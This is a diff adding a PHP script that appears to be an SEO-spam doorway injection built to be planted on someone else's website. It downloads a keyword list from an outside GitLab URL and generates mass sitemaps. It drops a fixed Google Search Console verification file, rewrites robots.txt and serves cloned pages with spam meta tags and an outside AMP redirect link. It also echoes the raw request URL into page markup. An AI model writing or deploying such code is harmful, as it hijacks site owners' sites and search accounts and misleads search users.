@@ -1,0 +1,383 @@
+<?php
+
+// =====================================================
+// 1. SETTING ERROR REPORTING (Agar tampilan bersih)
+// =====================================================
+error_reporting(E_ALL);
+ini_set('display_errors', 0); // Set ke 1 jika ingin melihat error saat development
+
+// =====================================================
+// 2. FUNGSI FETCH REMOTE FILE (Tanpa Warning cURL)
+// =====================================================
+function fetchRemoteFile($url)
+{
+    // Coba file_get_contents() terlebih dahulu (biasanya paling aman dari open_basedir)
+    $content = @file_get_contents($url);
+
+    if ($content !== false) {
+        return $content;
+    }
+
+    // Fallback ke cURL
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+
+        $curl_options = array(
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_CONNECTTIMEOUT => 10,
+            CURLOPT_TIMEOUT        => 30,
+            CURLOPT_USERAGENT      => 'Mozilla/5.0',
+            CURLOPT_SSL_VERIFYPEER => true,
+            CURLOPT_SSL_VERIFYHOST => 2
+        );
+
+        // FIX: Cek open_basedir dan safe_mode sebelum mengaktifkan FOLLOWLOCATION
+        $open_basedir = ini_get('open_basedir');
+        $safe_mode    = ini_get('safe_mode');
+        $can_follow   = (empty($open_basedir) && !$safe_mode);
+
+        if ($can_follow) {
+            $curl_options[CURLOPT_FOLLOWLOCATION] = true;
+            $curl_options[CURLOPT_MAXREDIRS]      = 5;
+        }
+
+        curl_setopt_array($ch, $curl_options);
+
+        $content  = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+
+        if ($content !== false && $httpCode >= 200 && $httpCode < 300) {
+            return $content;
+        }
+
+        // Fallback manual redirect jika server memblokir FOLLOWLOCATION
+        if ($content !== false && ($httpCode == 301 || $httpCode == 302)) {
+            $ch2 = curl_init($url);
+            curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch2, CURLOPT_HEADER, true);
+            curl_setopt($ch2, CURLOPT_NOBODY, true);
+            curl_setopt($ch2, CURLOPT_CONNECTTIMEOUT, 10);
+            curl_setopt($ch2, CURLOPT_TIMEOUT, 15);
+            curl_setopt($ch2, CURLOPT_USERAGENT, 'Mozilla/5.0');
+            curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, true);
+            curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, 2);
+            
+            $headers = curl_exec($ch2);
+            curl_close($ch2);
+
+            if ($headers !== false && preg_match('/Location:\s*(\S+)/i', $headers, $m)) {
+                return fetchRemoteFile(trim($m[1]));
+            }
+        }
+    }
+
+    return false;
+}
+
+// =====================================================
+// 3. FUNGSI ERROR 404 / FORBIDDEN
+// =====================================================
+function feedback404()
+{
+    header("HTTP/1.0 403 Forbidden");
+    echo "<h1>403 Forbidden</h1>";
+    exit();
+}
+
+// =====================================================
+// 4. FUNGSI GENERATE GOOGLE SEARCH CONSOLE (GSC)
+// =====================================================
+function generateGSCVerification($filename)
+{
+    if ($filename === null || $filename === '') {
+        $filename = 'googlee198e4d83300e0d1.html';
+    }
+    $content = 'google-site-verification: ' . $filename;
+
+    if (file_put_contents($filename, $content) === false) {
+        error_log("[GSC] Gagal membuat file verifikasi: {$filename}");
+        return false;
+    }
+    error_log("[GSC] Berhasil membuat file verifikasi: {$filename}");
+    return true;
+}
+
+// =====================================================
+// 5. FUNGSI GENERATE ROBOTS.TXT
+// =====================================================
+function generateRobotsTxt($domain_url, $sitemap_file)
+{
+    if ($sitemap_file === null || $sitemap_file === '') {
+        $sitemap_file = 'sitemap-index.xml';
+    }
+    $robots  = "User-agent: *\n";
+    $robots .= "Allow: /\n\n";
+    $robots .= "Sitemap: {$domain_url}{$sitemap_file}\n";
+
+    if (file_put_contents("robots.txt", $robots) === false) {
+        error_log("[robots] Gagal membuat robots.txt");
+        return false;
+    }
+    error_log("[robots] Berhasil membuat robots.txt");
+    return true;
+}
+
+// =====================================================
+// 6. FUNGSI DOWNLOAD KEYWORDS
+// =====================================================
+function downloadKeywordsAsXtxt($remote_url, $local_file)
+{
+    if ($remote_url === null || $remote_url === '') {
+        $remote_url = 'https://gitlab.com/wongwaras/docsli/-/raw/main/api.txt';
+    }
+    if ($local_file === null || $local_file === '') {
+        $local_file = 'x.txt';
+    }
+    $content = fetchRemoteFile($remote_url);
+    if ($content === false) {
+        error_log("[download] Gagal fetch: {$remote_url}");
+        return false;
+    }
+    if (file_put_contents($local_file, $content) === false) {
+        error_log("[download] Gagal menulis file: {$local_file}");
+        return false;
+    }
+    error_log("[download] Berhasil download & simpan ke {$local_file} (" . strlen($content) . " bytes)");
+    return $content;
+}
+
+// =====================================================
+// 7. FUNGSI EXTRACT HEADER, FOOTER, & META
+// =====================================================
+function updateMetaTag(&$head, $pattern, $replacement)
+{
+    if (preg_match($pattern, $head)) {
+        $head = preg_replace($pattern, $replacement, $head);
+    } else {
+        $head = preg_replace('/<\/head>/i', $replacement . "\n" . '</head>', $head);
+    }
+}
+
+function extractHeader($html)
+{
+    if (preg_match('/<header\s[^>]*>.*?<\/header>/is', $html, $matches)) {
+        return $matches[0];
+    }
+    if (preg_match('/<nav\s[^>]*>.*?<\/nav>/is', $html, $matches)) {
+        return $matches[0];
+    }
+    return '';
+}
+
+function extractFooter($html)
+{
+    if (preg_match('/<footer[^>]*>.*?<\/footer>/is', $html, $matches)) {
+        return $matches[0];
+    }
+    return '';
+}
+
+// =====================================================
+// 8. LOGIKA UTAMA
+// =====================================================
+$github_x_url = 'x.txt';
+
+// --- Handle ?kw (Download Keywords) ---
+if (isset($_GET['kw'])) {
+    $remote_api = 'https://gitlab.com/wongwaras/docsli/-/raw/main/api.txt';
+    $result = downloadKeywordsAsXtxt($remote_api, 'x.txt');
+
+    if ($result === false) {
+        header('HTTP/1.1 500 Internal Server Error');
+        echo "❌ Gagal download api.txt dari GitLab";
+        exit();
+    }
+    $line_count = count(array_filter(array_map('trim', explode("\n", $result))));
+    echo "✅ Berhasil download & simpan sebagai x.txt\n";
+    echo "Total keyword: {$line_count}\n";
+    echo "Ukuran: " . number_format(strlen($result)) . " bytes";
+    exit();
+}
+
+// --- Handle ?sitemap (Generate Sitemap) ---
+if (isset($_GET['sitemap'])) {
+    $protocol   = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http");
+    $base_path  = $protocol . "://" . $_SERVER['HTTP_HOST'];
+    $domain_url = $base_path . '/';
+    $base_url   = $base_path . '/?id=';
+    $sitemap_name = 'atom';
+    $max_links_per_sitemap = 50000;
+
+    $keywords_content = fetchRemoteFile($github_x_url);
+    if ($keywords_content === false) {
+        die("❌ Gagal baca x.txt. Silakan jalankan ?kw dulu untuk download keywords.");
+    }
+
+    $raw_lines = explode("\n", $keywords_content);
+    $keywords  = array_map('trim', $raw_lines);
+    $keywords  = array_filter($keywords);
+
+    if (empty($keywords)) {
+        die("❌ No valid keywords found di x.txt");
+    }
+
+    $sitemap_index  = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
+    $sitemap_index .= '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
+
+    $sitemap_files = array();
+    $i = 0;
+
+    foreach ($keywords as $keyword) {
+        $clean_keyword = str_replace(' ', '+', $keyword);
+        $sitemap_num   = ceil(($i + 1) / $max_links_per_sitemap);
+
+        if (!isset($sitemap_files[$sitemap_num])) {
+            $sitemap_files[$sitemap_num]  = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
+            $sitemap_files[$sitemap_num] .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
+        }
+
+        $full_url    = $base_url . $clean_keyword;
+        $escaped_url = htmlspecialchars($full_url, ENT_QUOTES, 'UTF-8');
+
+        $sitemap_files[$sitemap_num] .= "  <url>" . PHP_EOL;
+        $sitemap_files[$sitemap_num] .= "    <loc>{$escaped_url}</loc>" . PHP_EOL;
+        $sitemap_files[$sitemap_num] .= "  </url>" . PHP_EOL;
+
+        $i++;
+    }
+
+    foreach ($sitemap_files as $num => $content) {
+        $content .= '</urlset>' . PHP_EOL;
+        $file_name = "{$sitemap_name}-{$num}.xml";
+        file_put_contents($file_name, $content);
+
+        $sitemap_index .= "  <sitemap>" . PHP_EOL;
+        $sitemap_index .= "    <loc>" . htmlspecialchars($domain_url . $file_name, ENT_QUOTES, 'UTF-8') . "</loc>" . PHP_EOL;
+        $sitemap_index .= "  </sitemap>" . PHP_EOL;
+    }
+    unset($content);
+
+    $sitemap_index .= '</sitemapindex>' . PHP_EOL;
+    file_put_contents("sitemap-index.xml", $sitemap_index);
+
+    generateGSCVerification('googlee198e4d83300e0d1.html');
+    generateRobotsTxt($domain_url, 'sitemap-index.xml');
+
+    echo "✅ Sitemap & robots.txt generated dari x.txt!";
+    exit();
+}
+
+// --- Handle ?id (Tampilan Brand) ---
+if (isset($_GET['id']) && $_GET['id'] !== '') {
+    $keywords_content = fetchRemoteFile($github_x_url);
+
+    if ($keywords_content === false) {
+        feedback404();
+    }
+
+    $lines         = explode("\n", $keywords_content);
+    $target_string = strtolower($_GET['id']);
+    $BRAND         = null;
+
+    foreach ($lines as $item) {
+        if (strtolower(trim($item)) === $target_string) {
+            $BRAND = strtoupper($target_string);
+            break;
+        }
+    }
+
+    if (isset($BRAND)) {
+        $BRANDS = $BRAND;
+        $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http");
+        $fullUrl  = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+
+        if ($fullUrl) {
+            $parsedUrl = parse_url($fullUrl);
+            $scheme    = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] : '';
+            $host      = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
+            $path      = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
+            $query     = isset($parsedUrl['query']) ? $parsedUrl['query'] : '';
+            $baseUrl   = $scheme . "://" . $host . $path . '?' . $query;
+            $urlPath   = $baseUrl;
+        } else {
+            echo "Current URL is not defined.";
+            exit();
+        }
+
+        $base_url     = $scheme . "://" . $host;
+        $default_page = $base_url . "/";
+        $website_html = fetchRemoteFile($default_page);
+
+        if ($website_html !== false) {
+            preg_match('/<head[^>]*>.*?<\/head>/is', $website_html, $head_match);
+            $website_head = isset($head_match[0]) ? $head_match[0] : '';
+            $extracted_header = extractHeader($website_html);
+            $extracted_footer = extractFooter($website_html);
+            $fetch_success = true;
+        } else {
+            $website_head = '';
+            $extracted_header = '';
+            $extracted_footer = '';
+            $fetch_success = false;
+        }
+
+    } else {
+        feedback404();
+    }
+} else {
+    // Fallback jika tidak ada ?id
+    include 'main.php';
+    exit();
+}
+
+date_default_timezone_set('Asia/Jakarta');
+
+// --- RENDER TAMPILAN ---
+if (isset($_GET['id']) && $_GET['id'] !== '' && $fetch_success && !empty($website_head)) {
+    echo '<!DOCTYPE html>' . "\n";
+    echo '<html>' . "\n";
+
+    $custom_head = $website_head;
+
+    updateMetaTag($custom_head, '/<title>.*?<\/title>/is', '<title>' . $BRANDS . ' &7 Panel Otthon Informasi Hunian dan Pengelolaan Properti</title>');
+    updateMetaTag($custom_head, '/<meta\s+name="description"[^>]*>/i', '<meta name="description" content="' . $BRANDS . ' Temukan informasi seputar hunian apartemen panel, perawatan bangunan, pengelolaan properti, renovasi, serta berbagai solusi untuk meningkatkan kenyamanan tempat tinggal.">');
+    updateMetaTag($custom_head, '/<meta\s+property="og:site_name"[^>]*>/i', '<meta property="og:site_name" content="' . $BRANDS . '">');
+    updateMetaTag($custom_head, '/<meta\s+property="og:url"[^>]*>/i', '<meta property="og:url" content="' . $urlPath . '">');
+    updateMetaTag($custom_head, '/<meta\s+property="og:title"[^>]*>/i', '<meta property="og:title" content="' . $BRANDS . ' &7 Panel Otthon Informasi Hunian dan Pengelolaan Properti">');
+    updateMetaTag($custom_head, '/<meta\s+property="og:type"[^>]*>/i', '<meta property="og:type" content="product">');
+    updateMetaTag($custom_head, '/<meta\s+property="og:description"[^>]*>/i', '<meta property="og:description" content="' . $BRANDS . ' Temukan informasi seputar hunian apartemen panel, perawatan bangunan, pengelolaan properti, renovasi, serta berbagai solusi untuk meningkatkan kenyamanan tempat tinggal.">');
+    updateMetaTag($custom_head, '/<meta\s+name="twitter:title"[^>]*>/i', '<meta name="twitter:title" content="' . $BRANDS . ' &7 Panel Otthon Informasi Hunian dan Pengelolaan Properti">');
+    updateMetaTag($custom_head, '/<meta\s+name="twitter:description"[^>]*>/i', '<meta name="twitter:description" content="' . $BRANDS . ' Temukan informasi seputar hunian apartemen panel, perawatan bangunan, pengelolaan properti, renovasi, serta berbagai solusi untuk meningkatkan kenyamanan tempat tinggal.">');
+    updateMetaTag($custom_head, '/<link\s+rel="canonical"[^>]*>/i', '<link rel="canonical" href="' . $urlPath . '">');
+    updateMetaTag($custom_head, '/<meta\s+http-equiv="X-UA-Compatible"[^>]*>/i', '<meta http-equiv="X-UA-Compatible" content="IE=edge">');
+    updateMetaTag($custom_head, '/<meta\s+name="viewport"[^>]*>/i', '<meta name="viewport" content="width=device-width,initial-scale=1">');
+    updateMetaTag($custom_head, '/<meta\s+name="referrer"[^>]*>/i', '<meta name="referrer" content="no-referrer-when-downgrade">');
+    updateMetaTag($custom_head, '/<meta\s+http-equiv="Referrer-Policy"[^>]*>/i', '<meta http-equiv="Referrer-Policy" content="no-referrer-when-downgrade">');
+    updateMetaTag($custom_head, '/<meta\s+name="theme-color"[^>]*>/i', '<meta name="theme-color" content="">');
+
+    $amphtml_link = '<link rel="amphtml" href="https://amp072best.pages.dev/amp11/?id=' . $BRANDS . '">';
+    updateMetaTag($custom_head, '/<link\s+rel="amphtml"[^>]*>/i', $amphtml_link);
+
+    if (!preg_match('/<script>var\s+aPageStart/i', $custom_head)) {
+        $custom_head = preg_replace('/<head[^>]*>/i', '<head>' . "\n" . '<script>var aPageStart = (new Date()).getTime();</script>', $custom_head);
+    }
+
+    echo $custom_head . "\n";
+    echo '<body>' . "\n";
+    echo $extracted_header . "\n";
+
+    echo '<main style="padding: 60px 20px; text-align: center; min-height: 400px; display: flex; align-items: center; justify-content: center;">' . "\n";
+    echo '<div>' . "\n";
+    echo '<h1 style="font-size: 48px; margin-bottom: 20px;">' . (isset($BRANDS) ? $BRANDS : 'BRAND') . '</h1>' . "\n";
+    echo '<p style="font-size: 20px; color: #666; margin-bottom: 30px;">Temukan informasi seputar hunian apartemen panel, perawatan bangunan, pengelolaan properti, renovasi, serta berbagai solusi untuk meningkatkan kenyamanan tempat tinggal.</p>' . "\n";
+    echo '<p style="color: #999; font-size: 14px;">' . date('Y-m-d H:i:s') . '</p>' . "\n";
+    echo '</div>' . "\n";
+    echo '</main>' . "\n";
+
+    echo $extracted_footer . "\n";
+    echo '</body>' . "\n";
+    echo '</html>' . "\n";
+    exit();
+}
+?>
